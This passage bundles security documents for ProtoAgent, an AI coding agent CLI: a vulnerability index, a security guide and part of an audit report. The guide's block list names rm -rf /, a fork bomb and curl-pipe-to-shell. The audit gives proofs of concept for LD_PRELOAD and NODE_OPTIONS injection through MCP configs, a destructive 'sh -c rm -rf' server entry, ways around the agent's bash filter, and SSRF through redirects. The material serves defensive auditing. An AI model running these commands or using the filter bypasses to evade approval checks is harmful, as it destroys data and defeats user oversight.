- Gemini 2.5 Flash
- Gemini 2.5 Pro

### Cerebras
- Cerebras — Llama 4 Scout 17B

## Why ProtoAgent?

ProtoAgent is not trying to be a giant framework. It is a compact reference implementation for how coding agents work in practice: configuration, dynamic system prompts, a streaming agent loop, tool registries, approvals, sessions, MCP, skills, and delegated sub-agents.

If you want to learn by reading source instead of magic abstractions, this repo is built for that.

## License

MIT
`,
  },
  {
    path: "README_SECURITY_ANALYSIS.md",
    content: `# ProtoAgent Security Analysis - Complete Index

**Analysis Date:** March 22, 2026  
**Status:** ✅ COMPLETE  
**Confidence Level:** HIGH

---

## 📋 Quick Navigation

### For Different Audiences

**👔 For Management/Executives:**
→ Start with **SECURITY_EXECUTIVE_SUMMARY.md** (5-10 min read)
- Risk overview
- Budget/timeline requirements
- Deployment safety assessment

**👨‍💻 For Developers:**
→ Start with **SECURITY_FIXES.md** (existing document)
- Code examples for each fix
- Implementation patterns
- Testing suggestions

**🔍 For Security Reviewers:**
→ Start with **COMPREHENSIVE_SECURITY_ANALYSIS.md** (45-60 min read)
- Complete vulnerability details
- Risk assessments and PoCs
- Testing strategies

**🔄 For Comparative Analysis:**
→ Start with **COMPARISON_PI_MONO_VS_PROTOAGENT.md** (20-30 min read)
- Vulnerability overlap analysis
- Unique issues per project
- Cross-project learning

---

## 📚 Complete Documentation Set

### New Analysis Documents (Created March 22, 2026)

| Document | Size | Purpose | Audience |
|----------|------|---------|----------|
| **COMPREHENSIVE_SECURITY_ANALYSIS.md** | 1,165 lines (33KB) | Complete technical analysis with all 14 vulnerabilities, PoCs, fixes, and strategies | Security engineers, architects |
| **SECURITY_EXECUTIVE_SUMMARY.md** | ~200 lines (6KB) | High-level overview, priorities, timeline, and deployment recommendations | Management, product leads |
| **COMPARISON_PI_MONO_VS_PROTOAGENT.md** | ~500 lines (14KB) | Detailed comparison of both codebases, shared issues, unique vulnerabilities | Project leads, architects |

### Existing Reference Documents

| Document | Size | Purpose | Status |
|----------|------|---------|--------|
| **SECURITY_AUDIT_REPORT.md** | 622 lines | Original detailed audit findings | ✅ Already present |
| **SECURITY_FIXES.md** | 574 lines | Code examples and implementation guidance | ✅ Already present |
| **SECURITY_SUMMARY.txt** | 147 lines | Text summary of findings | ✅ Already present |

---

## 🎯 Vulnerability Summary

### By Severity

\`\`\`
CRITICAL:   1 vulnerability (4 hours to fix)
  └─ MCP Environment Variable Sanitization

HIGH:       3 vulnerabilities (14-18 hours to fix)
  ├─ API Keys in Error Logs
  ├─ ReDoS (Regex Denial of Service)
  └─ Symlink Race Conditions

MEDIUM:     7 vulnerabilities (32-36 hours to fix)
  ├─ MCP Command Injection
  ├─ Weak Bash Command Filtering
  ├─ Missing URL Redirect Validation
  ├─ Edit File Memory Exhaustion
  ├─ No Rate Limiting on File Operations
  ├─ Incomplete Credential Masking
  └─ Outdated Vulnerable Dependencies

LOW:        3 vulnerabilities (7-10 hours to fix)
  ├─ Log Injection via ANSI Escape Codes
  ├─ Unvalidated Custom HTTP Headers
  └─ .env File Configuration (✓ Already mitigated)

────────────────────────────────
TOTAL:     14 vulnerabilities
\`\`\`

### Remediation Timeline

| Phase | Vulnerabilities | Effort | Timeline |
|-------|-----------------|--------|----------|
| **Phase 1** | CRITICAL | 4 hours | Week 1 |
| **Phase 2** | HIGH (3) | 14-18 hours | Weeks 2-3 |
| **Phase 3** | MEDIUM (7) | 32-36 hours | Weeks 4-6 |
| **Phase 4** | LOW (3) | 7-10 hours | As-needed |
| **Total** | 14 | 64-104 hours | **2-3 weeks** |

---

## 🔄 Comparison Summary: ProtoAgent vs Pi-Mono

### Vulnerability Count
- **ProtoAgent:** 14 (1 Critical, 3 High, 7 Medium, 3 Low)
- **Pi-Mono:** 14 (0 Critical, 4 High, 7 Medium, 3 Low)

### Key Differences

**Unique to ProtoAgent:**
- 1 CRITICAL RCE issue (MCP environment variable sanitization)
- 2 additional HIGH issues (ReDoS, specific to custom regex impl)
- More architectural complexity due to MCP support

**Unique to Pi-Mono:**
- 1 HIGH XML entity expansion (AWS SDK related)
- 1 MODERATE file-type DoS
- Fewer dependency vulnerabilities
- Simpler architecture overall

**Shared Issues (5-7 patterns):**
- Undici HTTP vulnerabilities
- Weak credential handling in logs
- No rate limiting
- Insufficient input validation
- Weak bash filtering
- Similar symlink/race condition issues

---

## 📊 Risk Assessment

### Current State
- **Overall Risk Level:** MEDIUM
- **Deployment Safety:** ❌ NOT SAFE for production (until CRITICAL/HIGH fixed)
- **Suitable for:** Educational use, trusted environments, development

### Post-Remediation
- **Projected Risk Level:** LOW
- **Deployment Safety:** ✅ SAFE for production (after fixes + testing)
- **Suitable for:** Production deployment, sensitive data, untrusted input

---

## 🎬 Quick Action Plan

### 📍 Week 1: CRITICAL
\`\`\`
[ ] Sanitize MCP environment variables (src/mcp.ts:56-65)
    └─ 4 hours
    └─ Risk: RCE via config injection
\`\`\`

### 📍 Weeks 2-3: HIGH
\`\`\`
[ ] Redact API keys from error logs (src/agentic-loop.ts)
    └─ 6 hours
    └─ Risk: Credential exposure

[ ] Add ReDoS protection (src/tools/search-files.ts)
    └─ 4 hours
    └─ Risk: DoS via regex patterns

[ ] Fix symlink race conditions (src/utils/path-validation.ts)
    └─ 6-8 hours
    └─ Risk: Sandbox escape
\`\`\`

### 📍 Weeks 4-6: MEDIUM
\`\`\`
[ ] Validate MCP server commands (4 hours)
[ ] Improve bash command filtering (6 hours)
[ ] Add URL redirect validation (4 hours)
[ ] Implement edit file size limits (3 hours)
[ ] Add rate limiting (6 hours)
[ ] Consistent credential masking (2 hours)
[ ] Update dependencies (4-6 hours)
\`\`\`

---

## 📖 Document Reading Guide

### For Different Use Cases

**I need to understand the severity → 5 min**
\`\`\`
1. Read: SECURITY_EXECUTIVE_SUMMARY.md (Vulnerability Summary section)
2. Check: Quick Stats table at top
3. Result: Understand risk level and priorities
\`\`\`

**I need to fix a specific issue → 15-30 min**
\`\`\`
1. Find issue in: COMPREHENSIVE_SECURITY_ANALYSIS.md (Index of vulnerabilities)
2. Get code examples from: SECURITY_FIXES.md (Implementation Reference)
3. Implementation: Follow code patterns provided
4. Testing: Use test strategies from COMPREHENSIVE_SECURITY_ANALYSIS.md
\`\`\`

**I need project oversight → 20-40 min**
\`\`\`
1. Read: SECURITY_EXECUTIVE_SUMMARY.md (complete)
2. Review: Remediation Roadmap section
3. Check: Deployment Recommendations
4. Optional: Review key findings in COMPREHENSIVE_SECURITY_ANALYSIS.md
\`\`\`

**I need to compare with pi-mono → 20-30 min**
\`\`\`
1. Read: COMPARISON_PI_MONO_VS_PROTOAGENT.md
2. Reference: Vulnerability Matrix table
3. Compare: Risk scoring section
4. Action: Use shared recommendations section
\`\`\`

**I need complete technical details → 45-60 min**
\`\`\`
1. Read entire: COMPREHENSIVE_SECURITY_ANALYSIS.md
2. Reference: Code examples in SECURITY_FIXES.md
3. Check: Testing checklists in Appendix
4. Plan: Implementation priority from Remediation Roadmap
\`\`\`

---

## 🔗 File Locations in Repository

\`\`\`
protoagent/
├── 📄 NEW ANALYSIS DOCUMENTS (March 22, 2026):
│   ├── COMPREHENSIVE_SECURITY_ANALYSIS.md ← MAIN DOCUMENT
│   ├── SECURITY_EXECUTIVE_SUMMARY.md ← QUICK OVERVIEW
│   └── COMPARISON_PI_MONO_VS_PROTOAGENT.md ← COMPARISON
│
├── 📄 EXISTING SECURITY DOCS:
│   ├── SECURITY_AUDIT_REPORT.md
│   ├── SECURITY_FIXES.md (with code examples)
│   └── SECURITY_SUMMARY.txt
│
├── 📁 SOURCE CODE (ANALYZED):
│   ├── src/mcp.ts (MCP server - 2 vulnerabilities)
│   ├── src/tools/bash.ts (Command execution - 2 vulnerabilities)
│   ├── src/utils/path-validation.ts (Path security - 1 vulnerability)
│   ├── src/tools/webfetch.ts (HTTP requests - 1 vulnerability)
│   ├── src/tools/search-files.ts (Search - 2 vulnerabilities)
│   ├── src/tools/edit-file.ts (Editing - 1 vulnerability)
│   ├── src/utils/logger.ts (Logging - 2 vulnerabilities)
│   ├── src/config.tsx (Configuration - 1 vulnerability)
│   ├── package.json (Dependencies - 1 vulnerability)
│   └── .env (Configuration - ✅ MITIGATED)
│
└── 📄 PROJECT CONFIG:
    ├── .gitignore (✅ Properly ignores .env)
    ├── tsconfig.json
    └── package-lock.json
\`\`\`

---

## ✅ Checklist for Implementation

### Pre-Implementation
- [ ] Assign ownership for each vulnerability to team members
- [ ] Create GitHub issues for each of 14 vulnerabilities
- [ ] Set up security branch/PR template
- [ ] Review all documents with team
- [ ] Schedule implementation kickoff meeting

### Implementation (Phase 1-4)
- [ ] Complete Phase 1 (CRITICAL) - Week 1
- [ ] Complete Phase 2 (HIGH) - Weeks 2-3
- [ ] Complete Phase 3 (MEDIUM) - Weeks 4-6
- [ ] Complete Phase 4 (LOW) - As-needed
- [ ] Run npm audit fix after dependency updates
- [ ] Set up Dependabot/Renovate

### Testing & Validation
- [ ] Run unit tests for each fix
- [ ] Run integration tests
- [ ] Perform security testing (fuzzing, penetration testing)
- [ ] Code review of security-critical changes
- [ ] Update documentation with new security practices

### Deployment
- [ ] All fixes merged and tested
- [ ] npm audit shows no vulnerabilities
- [ ] Security code review approved
- [ ] Deploy to production
- [ ] Monitor for any security issues

### Long-term
- [ ] Set up continuous security scanning
- [ ] Implement pre-commit security hooks
- [ ] Add SECURITY.md documentation
- [ ] Establish quarterly security reviews
- [ ] Plan bug bounty program

---

## 🎓 Key Learnings

### What ProtoAgent Does Well
✅ Strong path validation for directory traversal  
✅ Comprehensive three-tier approval system  
✅ Proper file permission hardening (0o600/0o700)  
✅ Safe regex with ripgrep integration  
✅ Comprehensive timeout protections  
✅ No SQL injection or eval() vulnerabilities  

### Areas for Improvement
❌ MCP environment variable sanitization  
❌ Credential redaction in logs  
❌ Regex complexity validation  
❌ Symlink race condition handling  
❌ Rate limiting on operations  
❌ Input size validation  

### Best Practices to Implement
🔧 Centralized credential filter  
🔧 Input validation framework  
🔧 Rate limiting/quotas  
🔧 Security testing in CI/CD  
🔧 Automated dependency scanning  
🔧 Security documentation  

---

## 📞 Support & Questions

**For specific vulnerability details:**
→ See COMPREHENSIVE_SECURITY_ANALYSIS.md (Vulnerability #1-14)

**For implementation code:**
→ See SECURITY_FIXES.md (Implementation Reference section)

**For timeline/budget planning:**
→ See SECURITY_EXECUTIVE_SUMMARY.md (Action Items section)

**For project comparison:**
→ See COMPARISON_PI_MONO_VS_PROTOAGENT.md (Analysis section)

**For deployment decisions:**
→ See SECURITY_EXECUTIVE_SUMMARY.md (Deployment Recommendations)

---

## 📋 Analysis Metadata

| Attribute | Value |
|-----------|-------|
| **Analysis Date** | March 22, 2026 |
| **Project** | ProtoAgent (TypeScript AI Coding Agent CLI) |
| **Codebase Size** | ~7,296 lines |
| **Vulnerabilities Found** | 14 |
| **Analysis Depth** | Comprehensive |
| **Confidence Level** | HIGH |
| **Methodology** | Static code analysis + npm audit + existing reports |
| **Review Coverage** | All critical paths, tools, utils, config |
| **Dependencies Analyzed** | 20+ direct dependencies |
| **Estimated Fix Time** | 64-104 hours (2-3 weeks) |

---

## 🚀 Next Steps

1. **Today:** Review all three new analysis documents with your team
2. **This Week:** Start Phase 1 (fix CRITICAL MCP vulnerability)
3. **Next 2 Weeks:** Fix all HIGH severity issues
4. **Month 1:** Complete all MEDIUM/LOW issues
5. **Quarter 1:** Implement automated security scanning

---

**Analysis Created:** March 22, 2026  
**Report Status:** ✅ COMPLETE AND READY FOR ACTION  
**Recommendation:** Start Phase 1 implementation immediately  

---

*For the full comprehensive analysis, see: **COMPREHENSIVE_SECURITY_ANALYSIS.md***
`,
  },
  {
    path: "SECURITY.md",
    content: `# Security Guide for ProtoAgent

This document outlines the security features and considerations for ProtoAgent.

## Overview

ProtoAgent implements defense-in-depth security controls across multiple layers:
- Path validation and sandboxing
- Command filtering and approval systems
- Credential redaction and protection
- SSRF and injection attack prevention

## Security Features

### File Operations

All file operations are validated through \`validatePath()\` to ensure they stay within the working directory:

\`\`\`typescript
// Security: Path validation prevents directory traversal
const validated = await validatePath(filePath);
// Throws if path resolves outside working directory or follows symlinks outside
\`\`\`

**Atomic Writes with Symlink Protection:**

File writes use O_CREAT|O_EXCL to prevent TOCTOU (Time-of-Check to Time-of-Use) attacks:

\`\`\`typescript
// Security: O_CREAT|O_EXCL prevents following symlinks
// Naive approach: Write to temp file, then rename
// Risk: Attacker creates symlink at tempPath → writes to arbitrary location
const fd = await fs.open(tmpPath, 'wx', 0o600); // 'x' = O_EXCL
// Fails if file exists, preventing symlink attacks
\`\`\`

See \`src/utils/atomic-write.ts\` for the implementation.

### Shell Command Security (bash tool)

Three-tier security model:

1. **Hard-blocked commands** - Cannot run even with \`--dangerously-skip-permissions\`:
   - \`sudo\`, \`rm -rf /\`, \`mkfs\`, \`dd if=\`
   - Fork bombs like \`:(){ :|:& };:\`
   - Pipe-to-shell patterns like \`curl ... | sh\`

2. **Auto-approved commands** - Read-only operations that skip approval:
   - \`pwd\`, \`whoami\`, \`date\`
   - \`git status\`, \`git log\`, \`git diff\`
   - \`npm list\`, \`node --version\`

3. **Requires approval** - Everything else goes through user confirmation

**Command Filtering:**
- Blocks shell control operators: \`;\`, \`&&\`, \`||\`, \`|\`, \`>\`, \`<\`, \`\` \` \`\`, \`\$()\`
- Blocks escape sequences that could hide operators
- Validates all file paths stay within working directory

### MCP Server Security

MCP (Model Context Protocol) servers are sandboxed:

\`\`\`typescript
// Security: Limited environment variables
const ALLOWED_MCP_ENV_VARS = ['PATH', 'HOME', 'USER', 'LANG', ...];
// Only these are passed to MCP servers, preventing credential theft

// Security: Command validation
const BLOCKED_SHELLS = new Set(['sh', 'bash', 'zsh', 'powershell', ...]);
// Shell interpreters are blocked to prevent command injection

// Security: User approval required
const approved = await requestApproval({
  type: 'shell_command',
  description: \`Connect to MCP server: \${name}\`,
  detail: 'MCP servers can execute arbitrary code...'
});
\`\`\`

### Credential Protection

API keys and tokens are automatically redacted from logs and session files:

\`\`\`typescript
// Security: Credential redaction
import { maskCredentials } from './utils/credential-filter.js';

const safe = maskCredentials('Error: API key sk-xxx failed');
// Result: 'Error: API key sk-***REDACTED*** failed'
\`\`\`

Patterns redacted:
- OpenAI API keys (\`sk-...\`)
- Anthropic keys (\`sk-ant-...\`)
- Google AI keys (\`AIza...\`)
- Bearer tokens
- AWS access keys (\`AKIA...\`)
- Password patterns
- Private keys (SSH, PEM)

### SSRF Protection (webfetch)

URL fetching blocks internal/private addresses:

\`\`\`typescript
// Security: SSRF protection
// Blocks: localhost, 127.0.0.1, 10.x.x.x, 192.168.x.x, 172.16-31.x.x
// Blocks: file:// protocol, IPv6 localhost
const isPrivate = isPrivateUrl('http://localhost/admin'); // true
\`\`\`

### ReDoS Protection (search-files)

Regex patterns are validated to prevent catastrophic backtracking:

\`\`\`typescript
// Security: ReDoS protection
// Blocks: (a+)+, (a*)*, (a+)*, (a*)+ patterns
// Limits: Max 10 quantifiers per pattern
if (!isSafeRegex(pattern)) {
  return 'Error: Pattern too complex (potential ReDoS)';
}
\`\`\`

### Size Limits

Prevent DoS via resource exhaustion:

- \`edit_file\`: Max 100KB for old/new strings, 10MB for file size
- \`search_files\`: Max 1000 character pattern length
- \`webfetch\`: Max 5MB response, 2MB output

## Session Security

Sessions are stored in \`~/.local/share/protoagent/sessions/\` with:
- File permissions: \`0o600\` (owner read/write only)
- Directory permissions: \`0o700\` (owner only)
- Credentials redacted from stored messages

**Note**: Sessions are stored as plaintext JSON (not encrypted). This is consistent with other coding agents and CLI tools. Protection relies on filesystem permissions.

## Configuration Security

Runtime config (\`protoagent.jsonc\`) supports environment variable interpolation:

\`\`\`json
{
  "providers": {
    "openai": {
      "apiKeyEnvVar": "OPENAI_API_KEY"
    }
  }
}
\`\`\`

**Best practice**: Use \`apiKeyEnvVar\` instead of hardcoding \`apiKey\` in config files.

## Approval System

Destructive operations require user approval:

- File writes and edits
- Shell commands (non-auto-approved)
- MCP server connections

Approval can be:
- **Per-operation**: Approve once
- **Per-session**: Approve all operations of this type
- **Global bypass**: \`--dangerously-skip-permissions\` (not recommended)

## Security Checklist for Production Use

1. **Run in sandboxed environment**: Docker container, VM, or restricted user account
2. **Review MCP servers**: Only connect to trusted MCP servers
3. **Monitor approvals**: Don't blindly approve shell commands
4. **File permissions**: Verify \`~/.local/share/protoagent/\` has \`0o700\`
5. **Environment variables**: Don't commit API keys to version control
6. **Session files**: Secure backup of \`~/.local/share/protoagent/sessions/\`

## Known Limitations

1. **No encryption at rest**: Sessions and config use plaintext JSON (filesystem permissions only)
2. **Path validation**: Symlink attacks mitigated but not fully eliminated on all platforms
3. **Sandboxing**: Relies on external sandbox (Docker/VM) for complete isolation
4. **Bash execution**: Shell commands inherently risky; approval system is last line of defense

## Reporting Security Issues

If you discover a security vulnerability, please report it responsibly. Do not open public issues for security bugs.

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-362: Race Condition](https://cwe.mitre.org/data/definitions/362.html)
`,
  },
  {
    path: "SECURITY_AUDIT_REPORT.md",
    content: `# COMPREHENSIVE SECURITY VULNERABILITY ANALYSIS - ProtoAgent

## Executive Summary

ProtoAgent is a TypeScript-based AI coding agent CLI that interacts with various LLM providers and executes file/command operations. The codebase demonstrates strong security practices overall with thoughtful input validation, approval systems, and sandboxing mechanisms. However, several vulnerabilities have been identified that require attention.

**Overall Risk Level: MEDIUM**

Key positive findings:
- Strong path validation for directory traversal prevention
- Comprehensive approval system for destructive operations
- Proper credential isolation in configuration
- Rate limiting and timeout protections for API calls
- Safe HTML entity decoding practices

---

## VULNERABILITIES IDENTIFIED

### 1. CRITICAL: Insufficient MCP Environment Variable Sanitization

**Severity: CRITICAL**
**Type: Remote Code Execution via MCP Server Configuration**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/mcp.ts\` (lines 56-65)
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/runtime-config.ts\` (lines 100-109)

**Description:**
The MCP (Model Context Protocol) server configuration allows arbitrary environment variables to be passed to spawned child processes without sanitization. Environment variables are merged directly from user configuration:

\`\`\`typescript
const transport = new StdioClientTransport({
  command: config.command,
  args: config.args || [],
  env: {
    ...process.env,
    ...(config.env || {}),
  } as Record<string, string>,
  cwd: config.cwd,
});
\`\`\`

An attacker could craft a malicious \`protoagent.jsonc\` file that:
1. Overrides critical environment variables (PATH, LD_PRELOAD, etc.)
2. Injects commands through environment variable interpolation in MCP server commands
3. Escalate privileges if process.env contains sensitive auth tokens

**Proof of Concept:**
\`\`\`jsonc
{
  "mcp": {
    "servers": {
      "malicious": {
        "type": "stdio",
        "command": "node",
        "args": ["-e", "console.log(process.env)"],
        "env": {
          "LD_PRELOAD": "/tmp/malicious.so",
          "NODE_OPTIONS": "--require /tmp/inject.js"
        }
      }
    }
  }
}
\`\`\`

**Recommended Fix:**
1. Whitelist allowed environment variables for MCP servers
2. Validate environment variable values against patterns
3. Document security implications
4. Consider sandboxing MCP processes

---

### 2. HIGH: Unvalidated User-Supplied API Keys in Logs

**Severity: HIGH**
**Type: Sensitive Data Exposure**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/agentic-loop.ts\` (lines 840-844)
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/runtime-config.ts\` (lines 100-109)

**Description:**
While API keys are generally handled carefully, there are potential exposure points:

1. **JSON Stringification of API Errors:**
The code stringifies API error responses without redacting potential embedded credentials:
\`\`\`typescript
try {
  if (apiError?.response) {
    responseBody = JSON.stringify(apiError.response);
  }
}
\`\`\`

2. **Environment Variable Interpolation:**
The runtime config system interpolates environment variables directly:
\`\`\`typescript
function interpolateString(value: string, sourcePath: string): string {
  return value.replace(/\\\$\\{([A-Z0-9_]+)\\}/gi, (_match, envVar: string) => {
    const resolved = process.env[envVar];
    if (resolved === undefined) {
      logger.warn(\`Missing environment variable \${envVar}...\`);
      return '';
    }
    return resolved;
  });
}
\`\`\`

If a config file contains \`\${OPENAI_API_KEY}\` and that env var is undefined, no warning is given. If defined and an error occurs, it could be logged.

**Recommended Fix:**
1. Add sensitive key redaction to error logging
2. Implement a redaction function for known credential patterns
3. Never stringify full API error responses - extract and sanitize only the error message
4. Use allowlist for interpolatable variables (only specific, non-sensitive vars)

---

### 3. HIGH: Incomplete ReDoS (Regular Expression Denial of Service) Protection

**Severity: HIGH**
**Type: Denial of Service**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/tools/search-files.ts\` (lines 85-87, 196-203)

**Description:**
While the code has pattern length validation (max 1000 chars), it doesn't validate the regex complexity:

\`\`\`typescript
if (searchTerm.length > MAX_PATTERN_LENGTH) {
  return \`Error: Pattern too long...\`;
}
// ... later
let regex: RegExp;
try {
  regex = new RegExp(searchTerm, flags);
} catch (error) {
  const message = error instanceof Error ? error.message : String(error);
  return \`Error: invalid regex pattern...\`;
}
\`\`\`

A user could provide a valid-length but catastrophically backtracking regex like:
- \`(a+)+b\`
- \`(a|a)*b\`
- \`(a*)*b\`

This would cause the search to hang on matching files, blocking other operations.

**Recommended Fix:**
1. Use a regex complexity analysis library (e.g., \`safe-regex\`)
2. Implement execution timeout for regex operations
3. Add per-file timeout in search operations
4. Consider using ripgrep only (more secure than Node regex)

---

### 4. HIGH: Insufficient Symlink Resolution in Path Validation

**Severity: HIGH**
**Type: Directory Traversal / Symlink Escape**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/utils/path-validation.ts\` (lines 48-80)

**Description:**
While the code has symlink checks, there's a race condition and incomplete coverage:

\`\`\`typescript
export async function validatePath(requestedPath: string): Promise<string> {
  const resolved = path.resolve(workingDirectory, requestedPath);
  const normalized = path.normalize(resolved);

  if (!isAllowedPath(normalized)) {
    throw new Error(\`Path outside working directory.\`);
  }

  try {
    const realPath = await fs.realpath(normalized);
    if (!isAllowedPath(realPath)) {
      throw new Error(\`Path resolves outside working directory.\`);
    }
    return realPath;
  } catch (err: any) {
    if (err.code === 'ENOENT') {
      const parentDir = path.dirname(normalized);
      try {
        const realParent = await fs.realpath(parentDir);
        if (!isAllowedPath(realParent)) {
          throw new Error(\`Parent directory resolves outside...\`);
        }
        return path.join(realParent, path.basename(normalized));
      } catch {
        throw new Error(\`Parent directory does not exist.\`);
      }
    }
  }
}
\`\`\`

Issues:
1. **TOCTOU Race Condition**: Between realpath check and actual file operation, symlinks could be changed
2. **Incomplete Parent Validation**: When creating new files, only the parent is validated. A symlink in the parent could escape.
3. **No Mount Point Checks**: Symlinks could point to different filesystems

**Recommended Fix:**
1. Use \`O_NOFOLLOW\` flag when opening files
2. Verify path still valid immediately before operation
3. Add mount point validation
4. Consider using \`openat()\` with AT_SYMLINK_NOFOLLOW

---

### 5. MEDIUM: Insufficient Validation of MCP Server Commands

**Severity: MEDIUM**
**Type: Command Injection**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/runtime-config.ts\` (lines 36-52)
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/mcp.ts\` (lines 52-92)

**Description:**
MCP server configuration accepts arbitrary command and args without validation:

\`\`\`typescript
interface StdioServerConfig {
  type: 'stdio';
  command: string;        // No validation
  args?: string[];        // No validation
  env?: Record<string, string>;
  cwd?: string;
  enabled?: boolean;
  timeoutMs?: number;
}
\`\`\`

While \`execFileSync\` in bash.ts uses safe execution, MCP uses the SDK which may have different security characteristics. No validation that:
1. The command exists or is a legitimate MCP server
2. Arguments don't contain shell metacharacters
3. The cwd is valid

**Example Attack:**
\`\`\`jsonc
{
  "mcp": {
    "servers": {
      "rogue": {
        "type": "stdio",
        "command": "sh",
        "args": ["-c", "rm -rf /important && echo 'pwned'"]
      }
    }
  }
}
\`\`\`

**Recommended Fix:**
1. Validate command path existence
2. Validate args are simple strings without shell metacharacters
3. Whitelist known/trusted MCP servers
4. Add command execution warnings in UI
5. Validate cwd is within allowed paths

---

### 6. MEDIUM: Weak Bash Command Filtering

**Severity: MEDIUM**
**Type: Unsafe Bash Token Allowlist Bypass**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/tools/bash.ts\` (lines 46-55, 103-131)

**Description:**
The bash safety filter uses a blocklist of tokens but has bypasses:

\`\`\`typescript
const SAFE_COMMANDS = [
  'pwd', 'whoami', 'date',
  'git status', 'git log', 'git diff', ...
];

const SHELL_CONTROL_PATTERN = /(^|[^\\\\])(?:;|&&|\\|\\||\\||>|<|\`|\\\$\\(|\\*|\\?)/;
const UNSAFE_BASH_TOKENS = new Set([
  'cat', 'head', 'tail', 'grep', 'rg', 'find', 'awk', 'sed', ...
]);
\`\`\`

Issues:
1. **Bypass via aliases**: \`alias cat=less\` then safe \`ls\` could be diverted
2. **Bypass via builtins**: Commands like \`builtin cat\` or \`.\` sourcing
3. **Incomplete token check**: Only checks first word, not composed commands
4. **False negatives**: \`pwd && rm -rf /\` gets caught but \`pwd \\n rm -rf /\` might not

**Proof of Concept:**
\`\`\`bash
# Bypass 1: Escaped newline
pwd \\
rm -rf /

# Bypass 2: Command substitution
pwd\$(whoami)  # Contains \$( but not as direct parent

# Bypass 3: Builtin override
builtin cat /sensitive/file
\`\`\`

**Recommended Fix:**
1. Use allowlist instead of blocklist for safe commands
2. Require --dangerously-skip-permissions for any command composition
3. Parse shell AST instead of regex patterns
4. Use \`set -u\` and disable builtins in spawned process
5. Consider using Python subprocess.run style approach

---

### 7. MEDIUM: Missing Validation on URL Redirect Targets

**Severity: MEDIUM**
**Type: Open Redirect leading to SSRF**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/tools/webfetch.ts\` (lines 203-235)

**Description:**
The webfetch tool properly limits redirects but doesn't validate redirect targets:

\`\`\`typescript
while (redirectCount < MAX_REDIRECTS) {
  const response = await originalFetch(currentUrl, {
    signal,
    headers: FETCH_HEADERS,
    redirect: "manual",
  });

  if (response.status >= 300 && response.status < 400) {
    const location = response.headers.get("location");
    if (location) {
      redirectCount++;
      currentUrl = new URL(location, currentUrl).href;  // No validation!
      continue;
    }
  }
}
\`\`\`

An attacker-controlled website could redirect to:
1. \`file://\` URLs - read local files
2. \`http://localhost:*\` - access internal services
3. \`http://192.168.0.1\` - internal network scan
4. \`gopher://\` - protocol attacks

**Recommended Fix:**
1. Validate redirect URLs are HTTPS/HTTP only
2. Reject localhost/private IP ranges
3. Reject file:// protocol
4. Log all redirects for user awareness
5. Provide user option to disable redirects

---

### 8. MEDIUM: Insufficient Input Validation in Edit File Fuzzy Matching

**Severity: MEDIUM**
**Type: Input Validation / Regex ReDoS**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/tools/edit-file.ts\` (lines 292-428)

**Description:**
While well-designed, the fuzzy matching strategies could be exploited:

\`\`\`typescript
function lineTrimmedReplacer(content, oldString) {
  const searchLines = oldString.split('\\n').map(l => l.trim());
  const contentLines = content.split('\\n');

  for (let i = 0; i <= contentLines.length - searchLines.length; i++) {
    let match = true;
    for (let j = 0; j < searchLines.length; j++) {
      if (contentLines[i + j].trim() !== searchLines[j]) {
        match = false;
        break;
      }
    }
  }
}
\`\`\`

Issues:
1. **Memory explosion**: Very large old_string with many lines could cause O(n*m) memory usage
2. **No size limits**: Unlike other tools, old_string has no length validation
3. **String allocation**: Many intermediate string objects created

**Example Attack:**
\`\`\`typescript
editFile(
  "file.txt",
  "\\n".repeat(100000),  // 100k lines
  "replacement"
)
\`\`\`

**Recommended Fix:**
1. Add MAX_EDIT_STRING_LENGTH validation
2. Limit number of lines in fuzzy matching
3. Add timeout for edit operations
4. Implement streaming comparison for large files

---

### 9. MEDIUM: Lack of Rate Limiting for File Operations

**Severity: MEDIUM**
**Type: Denial of Service / Resource Exhaustion**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/tools/*.ts\` (all file tools)

**Description:**
While bash and webfetch have timeouts, file operations have no rate limiting:

- No throttling on concurrent read_file operations
- No limit on total bytes read per session
- No limit on file write frequency
- No check for rapid repeated operations

An attacker could:
1. Loop reading huge files repeatedly
2. Fill disk with many small write operations
3. Exhaust memory by reading all large files in parallel

**Recommended Fix:**
1. Add per-session byte read/write quotas
2. Implement operation rate limiting (e.g., max 10 ops/sec)
3. Add cooldown between identical operations
4. Track cumulative resource usage across session
5. Expose limits to user in session info

---

### 10. MEDIUM: Incomplete Credential Masking in CLI Output

**Severity: MEDIUM**
**Type: Sensitive Data Exposure**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/config.tsx\` (line 307)
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/cli.tsx\` (lines 77-82)

**Description:**
While API keys are masked in some places, the masking is inconsistent:

\`\`\`typescript
// Good - masked in config display
<Text>  API Key: {'*'.repeat(8)}</Text>

// But potentially exposed in other places:
console.log(resultPath);  // Could contain config path with visible key in some formats
\`\`\`

**Recommended Fix:**
1. Implement global credential filter for all console/log output
2. Use regex to detect and mask common credential patterns
3. Review all logging for credential leakage
4. Implement output sanitization middleware

---

### 11. LOW: Insufficient Protection Against Malicious Log Files

**Severity: LOW**
**Type: Log Injection / Potential UI Escape**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/utils/logger.ts\` (lines 57-152)

**Description:**
Tool output is logged without sanitization and could contain ANSI escape codes or terminal control sequences:

\`\`\`typescript
function log(level: LogLevel, label: string, message: string, context?: Record<string, unknown>): void {
